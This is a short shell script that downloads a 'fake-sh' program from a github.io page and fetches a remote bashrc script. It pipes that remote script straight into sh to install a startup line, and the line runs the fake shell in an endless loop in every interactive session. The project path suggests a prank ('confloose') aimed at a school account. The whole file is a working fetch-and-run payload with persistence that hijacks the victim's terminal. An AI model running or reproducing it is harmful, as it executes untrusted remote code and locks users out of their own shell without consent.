#!/bin/sh

tempdir=$(mktemp -d)

curl "https://d-002.github.io/epita/confloose/fake-sh/sh.sh" >> "$tempdir/sh"
chmod +x "$tempdir/sh"

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-sh" "\"if [ -n \\\"\\\$PS1\\\" ]; then while true; do $tempdir/sh; done; fi\"" | sh
